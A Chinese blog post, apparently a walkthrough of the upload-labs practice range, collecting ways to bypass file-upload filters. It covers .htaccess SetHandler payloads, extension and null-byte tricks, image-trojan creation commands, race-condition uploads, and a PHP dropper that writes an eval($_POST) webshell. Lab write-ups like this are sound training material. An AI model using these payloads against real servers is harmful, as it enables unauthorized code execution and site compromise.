---
title: "文件上传漏洞常见限制与绕过"
permalink: file-upload-bypass/
date: 2025-12-11 05:28:36
categories:
  - 网络安全
  - Web 安全
tags:
  - 文件上传
  - Webshell
  - 绕过
img: /medias/featureimages/11.jpg
summary: "前端限制、MIME、后缀黑名单、.htaccess、条件竞争、二次渲染等上传限制的绕过手法汇总。"
---

<!-- more -->

## upload labs 靶场

github  :  [https://github.com/c0ny1/upload-labs](https://github.com/c0ny1/upload-labs)

作者提供的环境(Windows)  : [https://github.com/c0ny1/upload-labs/releases](https://github.com/c0ny1/upload-labs/releases)

## Pass-01 ✨
+ **防御方法：白名单**
+ **绕过方法：前端验证 （前端验证、过滤是无意义的）**

### 绕过方法1 - 修改JS

```php
function checkFile() {
        var file = document.getElementsByName('upload_file')[0].value;
        if (file == null || file == "") {
            alert("请选择要上传的文件!");
            return false;
        }
        //定义允许上传的文件类型
        var allow_ext = ".jpg|.png|.gif|.php";
        //提取上传文件的类型
        var ext_name = file.substring(file.lastIndexOf("."));
        //判断上传文件类型是否允许上传
        if (allow_ext.indexOf(ext_name) == -1) {
            var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
            alert(errMsg);
            return false;
        }
    }
```

在控制台中运行新的 js 代码

重新上传 php 文件，即可绕过前端验证

### 绕过方法2 - 替换JS
#### 1  随意创建一个文件夹

#### 2  设置 chrome的替换功能

#### 3  刷新网站，回到js位置，已经可以直接编辑，编辑代码后，按 “Ctrl S” 保存

#### 4  在开发者工具打开时，会替换 js 代码为已修改的代码，是持久性的 （开发者工具需要一直打 开才能用
**没有响应（可以采取bp 抓包）**



### 绕过方法3 - 禁用js
不推荐，因为很多依赖js渲染或异步加载的网站，如果禁用js，就无法打开

### 绕过方法4 - burp抓包
```xml
上传 jpg/png 文件
 burp 抓包，修改文件名
```

#### 方法4 拦截器也可以实现

## Pass-02  ✨
后端拦截了 MIME，修改MIME为 image/png image/jpeg image/gif 即可绕过

## Pass-03
正常情况下，php 文件的后缀名是 .php ，但是开发者可以通过apache的配置文件增加其他的后 缀名

```xml
如下配置，指定 .php 、 .php3 、 .phtml 的文件都是 php 文件
AddType application/x-httpd-php .php .php3 .phtml
```

此关卡拦截了 .php 文件，直接把后缀改为 .php3 或 .phtml 即可绕过

## Pass-04  ✨
上传 png 文件，无法使用

### 绕过方法 - apache 解析策略文件
**.htaccess** 是apache解析策略文件，规定了当前目录的文件怎么解析

### 方法1：强制让当前目录的所有文件都当做php解析
```xml
.htaccess 文件内容如下：
SetHandler application/x-httpd-php
```

上传 .htaccess 文件，当前目录的所有文件都当做php解析，如下图 webshell_eval.png 会被当做 php代码执行

### 方法2：指定当前目录的一个文件当做php解析
```xml
.htaccess 文件内容如下

<FilesMatch "替换成自己上传的图片文件名">
 SetHandler application/x-httpd-php
</FilesMatch>
```

上传 .htaccess 文件，只有当前目录的 webshell_eval.png 文件当做php解析，不会影响其他文件

## Pass-05-10
+ Pass 05 ： windows大小写不敏感，后缀名从 **.php** 改为 **.PHP** 即可
+ Pass 06 ： windows认为文件的结尾有空格 = 没有空格，后缀名从 **.php** 改为 **.php空格** 即可

**如："han.php" 改为 "han.php       "**

+ Pass 07 ： windows认为文件的结尾有 点 = 没有点 ， 后缀名从 **.php** 改为 **.php.** 即可

**如："han.php" 改为 "han.php."**

+ Pass 08 ：windows ntfs 文件流格式为 **文件名:流名:$DATA** ，**流名可以为空**，后缀名从 .php  改为        .php::$DATA 即可  [https://learn.microsoft.com/zh-cn/windows/win32/fileio/file-streams](https://learn.microsoft.com/zh-cn/windows/win32/fileio/file-streams)

      如："**han.php**" 改为 "**han.php::$DATA**"   ,  **:流名:**

+ Pass 09：单纯的ctf题目， 后缀名从 **.php 改为 .php.空格.** 即可

      如："**han.php**" 改为  "**han.php.     .**"

+  Pass 10：把后缀名替换成了空，可以双写绕过，后缀名从 .php 改为 .pphphp 即可

      如："**han.php**"  改为 "**han.pphphp**"

## Pass 11  ✨GET 型参数 00 截断路径
### 前提条件
```xml
php 小于 5.3
php 配置 magic_quotes_gpc = Off
```

### 利用方式

### 原理 :
```xml
路径 ../upload/1.php%00
文件名:han1_eval.png
上传文件时会拼接路径和文件名形成 ../upload/1.php%00/han1_eval.png

%00 在 c/php 中代表字符串结束， ../upload/1.php%00/han1_eval.png 实际是
../upload/1.php ，所以实际上传的是 1.php
```

## Pass 12  ✨POST 型参数 00 截断路径
⚠️  POST怎么输入 %00 ，输入%00 再burp进行URL解码即可

`文件上传请求头中的 Content-Type 通常是 multipart/form-data`

## Pass-13✨
防御策略：验证图片文件头魔数，只允许上传真实的 jpg png gif 图片

绕过方法：上传图片马 + 文件包含解析图片马

### 制作图片马
准备文件1：真实的图片 jpg、png、gif，不要太大

准备文件2：han1_eval.php

操作：把php 文件追加到 png文件末尾

(windows 制作 图片马)

`copy  tp.png/b + han1_eval.php/a tpev.png`

解释：二进制文件.png 和 ascii 字符文件 php 加在一起生成新的文件(图片马) .png

Linux 制作图片马

`cat your_filename.png your_filename.php > your_filename.png  `

###  绕过方法 - 解析图片马
制作的图片马依然是图片，需要借助中间件解析策略 （apache **.htaccess**） 或文件包含漏洞才能把图片马解析执行起来

文件包含漏洞演示：

`http://your_ip/include.php?file=上传的图片马相对路径`

连接

## Pass 14-15
和 Pass13 完全一致

## Pass 16 ✨
操作与Pass 13 一致，图片换为特殊的图片即可

### 防御措施：
只允许上传真实的图片，会压缩图片[二次渲染] （攻击者上传的图片马经过压缩后图 片中的webshell就没了）

### 解决方案：
找一个 gif 图片，这个图片有一个区块，压缩前和压缩后是无变化的，上传这个抗二 次渲染的 gif 图片马即可

## Pass 17 ✨
### 条件竞争
### 防御措施：
用户上传文件，服务器接收并保存用户上传的文件，服务器判断用户上传的文件是否 是木马，如果是木马，就删除

### 缺陷：
用户上传的木马会在目标机器停留极短的时间，就被删除

### 绕过方法 - 竞争上传
一直上传，就会有一瞬间webshell_eval.php是在服务器上的，攻击者只需要在同一时刻访问到 webshell_eval.php 即可看到攻击效果

### 绕过方法 - 竞争访问
竞争上传时，同时竞争访问

`http://your_target_ip/upload/your_webshell_filename.php  `

### 优化webshell
```php
<?php
  file_put_contents("nb.php", "<?php eval(\$_POST[a]);?>", LOCK_EX);
?>
```

条件竞争上传webshell，同时条件竞争访问 webshell，如果访问成功，webshell 就会自己用 file_put_contents 创建一个新的 webshell 文件
